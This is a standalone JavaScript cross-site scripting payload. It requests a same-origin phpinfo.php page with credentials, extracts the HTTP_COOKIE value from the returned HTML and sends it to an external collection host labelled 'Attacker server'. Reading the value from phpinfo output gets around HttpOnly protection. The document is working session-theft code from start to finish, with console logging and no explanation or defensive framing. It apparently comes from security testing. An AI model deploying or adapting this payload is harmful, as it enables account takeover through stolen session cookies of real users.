<script>
(function(){

    console.log("[XSS] Script started.");

    // URL of phpinfo() page on SAME ORIGIN
    var target = "/phpinfo.php";

    // Attacker server
    var exfil = "https://nc34doz02j9fb1nwy2xsok69s0yrmlaa.oastify.com/collect?data=";

    try {

        var req = new XMLHttpRequest();
        req.withCredentials = true;
        req.open("GET", target, true);

        req.onload = function() {

            console.log("[XSS] First request completed. Status:", this.status);

            if (this.status !== 200) {
                console.error("[XSS] phpinfo request did not return 200 OK. Response:", this.responseText.slice(0,200));
                return;
            }

            var html = this.responseText;
            console.log("[XSS] Received phpinfo HTML (length =", html.length, ")");

            // Extract
            var start = html.indexOf("HTTP_COOKIE");
            console.log("[XSS] Index of 'HTTP_COOKIE':", start);

            var value = "";

            if (start !== -1) {
                try {
                    var cut = html.substring(start);
                    console.log("[XSS] Substring after match:", cut.slice(0,200));

                    var vStart = cut.indexOf('<td class="v">') + 15;
                    var vEnd   = cut.indexOf("</td>", vStart);

                    console.log("[XSS] vStart:", vStart, "vEnd:", vEnd);

                    value = cut.substring(vStart, vEnd).trim();
                    console.log("[XSS] Extracted value:", value);

                } catch (innerErr) {
                    console.error("[XSS] ERROR extracting value:", innerErr);
                    value = "ERROR_EXTRACTING_VALUE";
                }
            } else {
                value = "NOT FOUND IN PAGE";
                console.warn("[XSS] 'HTTP_COOKIE' not found in HTML.");
            }

            // Second request: exfiltrate
            try {
                console.log("[XSS] Sending exfil request…");

                var req2 = new XMLHttpRequest();
                req2.open("GET", exfil + encodeURIComponent(value), false);
                req2.send();

                console.log("[XSS] Exfil request SENT.");
            } catch (exfilErr) {
                console.error("[XSS] ERROR during exfil:", exfilErr);
            }

        };

        req.onerror = function() {
            console.error("[XSS] Error with first request.");
        };

        console.log("[XSS] Sending first request…");
        req.send();

    } catch (err) {
        console.error("[XSS] Fatal script error:", err);
    }

})();
</script>
